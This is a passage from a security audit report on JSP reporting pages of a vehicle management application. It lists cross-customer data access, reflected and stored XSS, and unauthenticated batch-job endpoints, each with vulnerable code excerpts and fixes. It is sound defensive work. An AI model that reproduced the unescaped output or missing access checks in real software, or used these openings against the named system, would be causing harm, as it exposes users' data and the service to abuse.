`rpt_driver_licence_expiry_detail.jsp` accepts `cust_cd`, `loc_cd`, `dept_cd` from request parameters and uses them to query driver licence expiry details. Unlike the parent page `rpt_driver_licence_expiry.jsp`, this detail page does not call `filter.setAccess_level()`, `filter.setAccess_cust()`, `filter.setAccess_site()`, or `filter.setAccess_dept()` before calling `filter.init()`. A user who directly calls this page with an arbitrary `cust_cd` value may be able to retrieve licence data for drivers belonging to a different customer.

**Evidence:**

`rpt_driver_licence_expiry_detail.jsp`:
```jsp
String cust_cd = request.getParameter("cust_cd")==null?"":request.getParameter("cust_cd");
String loc_cd = request.getParameter("loc_cd")==null?"":request.getParameter("loc_cd");
String dept_cd = request.getParameter("dept_cd")==null?"":request.getParameter("dept_cd");
// ...
filter.setSet_opcode(op_code);
filter.setSet_cust_cd(cust_cd);
filter.setSet_loc_cd(loc_cd);
filter.setSet_dept_cd(dept_cd);
filter.init();
// Missing: setAccess_level(), setAccess_cust(), setAccess_site(), setAccess_dept()
```

**Recommendation:**
Add the standard access scoping block (same as A14-17 recommendation) to `rpt_driver_licence_expiry_detail.jsp` before `filter.init()`.

---

### A14-21 — Reflected XSS and Stored XSS in `display_report.jsp`

**Files:**
- `display_report.jsp` lines 396–406, 498–539

**Severity:** Medium

**Category:** Cross-Site Scripting (Reflected and Stored)

**Description:**
`display_report.jsp` reflects multiple request parameters (`do_list`, `undo_list`, `sort_by`, `sort_asc`) into inline JavaScript `onclick` handlers on buttons without encoding. These are arrays/lists of column indices that can be manipulated by an attacker. Additionally, DB data values (date, time, temperature readings) are output using `<%= %>` without escaping.

**Evidence:**

```jsp
// Line 396–403 (onclick handlers with reflected params):
onclick="undo_last('<%=do_list %>','<%=undo_list %>');"
onclick="undo_last('<%=do_list %>','<%=undo_list %>','<%=sort_by %>','<%=sort_asc %>');"
onclick="redo_last('<%=do_list %>','<%=undo_list %>');"

// Lines 498–508 (DB data output):
<td align = right><%=Vdate.get(j) %>
<td align = right><%=Vtime.get(j) %>
<td align = right><%=Vio0_data0.get(j) %>
```

**Recommendation:**
Validate `do_list`, `undo_list` to only contain digits and commas. Validate `sort_by` and `sort_asc` to numeric values. Apply `StringEscapeUtils.escapeEcmaScript()` before interpolating any parameter into JavaScript. Apply HTML encoding to all DB data before output.

---

### A14-22 — Stored XSS: Customer/Site/Dept Display Names in Page Headings

**Files:**
- `rpt_imp_set_lst.jsp` line 87
- `rpt_override_code_lst.jsp` lines 88–91

**Severity:** Medium

**Category:** Cross-Site Scripting (Stored)

**Description:**
Customer name, site name, and department name are retrieved from the database via `filter.getCust_name_disp()`, `filter.getLoc_name_disp()`, and `filter.getDept_name_disp()` and output directly into the page heading without encoding. If any of these names contains HTML special characters (configured through an administration screen), the content will be rendered as HTML.

**Evidence:**

`rpt_imp_set_lst.jsp`:
```jsp
// Line 87:
<strong>List of Vehicles and their Impact Settings for Customer:<%=get_cust %> for Site:<%=get_loc %>. </strong>
```

`rpt_override_code_lst.jsp`:
```jsp
// Lines 88–91:
<strong>List of Vehicles and their Master Override Codes for Customer:<%=get_cust %> &nbsp;&nbsp; for Site:<%=get_loc %>  &nbsp;&nbsp;
<%if(!get_dep.equalsIgnoreCase("")) {%>
for Department: <%= get_dep%>.
```

**Recommendation:**
HTML-encode `get_cust`, `get_loc`, `get_dep` before output: `<c:out value="${get_cust}" escapeXml="true"/>`.

---

### A14-23 — Unauthenticated Batch Mail Trigger Endpoint

**Files:**
- `rpt_call_mail.jsp`

**Severity:** Medium

**Category:** Broken Access Control / Information Disclosure

**Description:**
`rpt_call_mail.jsp` accepts `debug` and `email` parameters from the request and triggers the batch email sending process (`filter1.call_email()` or `filter1.call_email_au()`). The file does not include `../sess/Expire.jsp` or any visible session authentication check. If this endpoint is accessible without authentication, an attacker could trigger unsolicited batch emails to configured recipients, or use the `debug` parameter to obtain diagnostic information. Similarly, `rpt_call_alertmail.jsp` and `rpt_cal_impact.jsp` trigger server-side jobs without visible authentication checks.

**Evidence:**

`rpt_call_mail.jsp`:
```jsp
String debug = request.getParameter("debug")==null?"false":request.getParameter("debug");
String email = request.getParameter("email")==null?"":request.getParameter("email");

LindeConfig lf = new LindeConfig();
if( LindeConfig.siteName.equalsIgnoreCase("AU") ){
    filter1.setDebug(debug);
    filter1.setEmail(email);
    filter1.call_email_au();
    filter1.callLindeReports();
}else{
    filter1.setDebug(debug);
    filter1.setEmail(email);
    filter1.call_email();
}
```

**Recommendation:**
1. Add session authentication checks to all batch job trigger JSPs.
2. Restrict access to job-trigger endpoints via web.xml security constraints or a servlet filter requiring authenticated session with `access_level` of 1 (admin).
3. Remove the `debug` and `email` parameters from public-facing JSPs; batch jobs should be triggered by a scheduler or internal mechanism only.

---

## Notes on Scope

The following files were reviewed and found to have low security impact or no user-facing output; they are noted here for completeness:

- `rpt_cal_impact.jsp` — Triggers `calibrate_impact()` with no parameters; no HTML output. Authentication check absent; see A14-23 pattern.
- `rpt_call_alertmail.jsp` — Triggers `call_alertemail()` with no parameters; no HTML output. Authentication check absent.
- `rpt_call_dup_session.jsp`, `rpt_call_recover_session.jsp`, `rpt_call_remove_old_pstat.jsp`, `rpt_call_driver_licence_msg.jsp` — Batch job triggers with no visible HTML output or user-supplied parameters.
- `gdpr_data_delete.jsp` — Triggers `call_gdpr_delete_data()` with no parameters; no HTML output. Authentication check absent.
- `rpt_unit_summary_nz.jsp` — Minimal; invokes bean with hardcoded opcode.
- `send_timezone.jsp`, `send_updatepreop.jsp` — Minimal action endpoints.
- `rpt_monthly.jsp` — Minimal; delegates to bean.
- `rpt_monthly_charts.jsp`, `rpt_national_monthly.jsp`, `rpt_national_monthly_charts.jsp` — Chart generation pages; same XSS pattern as A14-1 applies.
- `get_site.jsp`, `get_dept.jsp`, `get_user.jsp`, `get_customer.jsp`, `get_vehicle_dept.jsp` — AJAX data return pages; output XML; XSS in XML context is lower risk but the JSON/XML values from these pages should still be encoded.
- `get_driverblacklist.jsp` — Returns JSON with `escapeJson()` helper function present; this is the only file in the entire `reports/` directory that performs any output encoding. However, the `scr` parameter is still reflected unencoded in `rpt_blacklist_driv.jsp` (A14-10).
- `xlsx_report.jsp`, `xlsx_report_mail.jsp`, `xlsx_driver_access_abuse_report.jsp`, `xlsx_driver_access_abuse_report_mail.jsp`, `xlsx_input_mail.jsp` — Delegate to `ExcelUtil`; see A14-16.
- `param_test.jsp` — Diagnostic page; should be removed from production.
- `z_scripts.jsp` — Script holder; no HTML output.
- `rtls_impact.jsp`, `rtls_caculateImpactCacheTable.jsp`, `gpsImpact.jsp`, `gpsImpactEmail.jsp` — RTLS/GPS specific pages; same general XSS and access control patterns apply.
- `hire_vehicle_lst.jsp`, `hire_vehicle_lst1.jsp`, `nothire_vehicle_lst.jsp`, `uncal_vehicle_lst.jsp`, `unrep_vehicle_lst.jsp`, `dislockout_vehicle_lst.jsp`, `cric_issues_lst.jsp` — Vehicle list pages; same XSS pattern.
- `alert_password_expiry.jsp` — Password expiry alert; same pattern.
- `importServiceServer.jsp` — Service import; should be reviewed separately.
- `fix_department.jsp` — Administrative maintenance page.
- `print_*` and `email_*` pages — These are analogues of the corresponding `rpt_*` pages and share the same XSS vulnerabilities (A14-1). They were not individually enumerated in the findings but are covered by A14-1.

---

## Finding Count

**Total findings: 23** (A14-1 through A14-23)

**Critical: 1** (A14-14)
**High: 9** (A14-1, A14-2, A14-4, A14-7, A14-8, A14-12, A14-13, A14-17, A14-20)
**Medium: 13** (A14-3, A14-5, A14-6, A14-9, A14-10, A14-11, A14-15, A14-16, A14-18, A14-19, A14-21, A14-22, A14-23)

---

*End of report.*
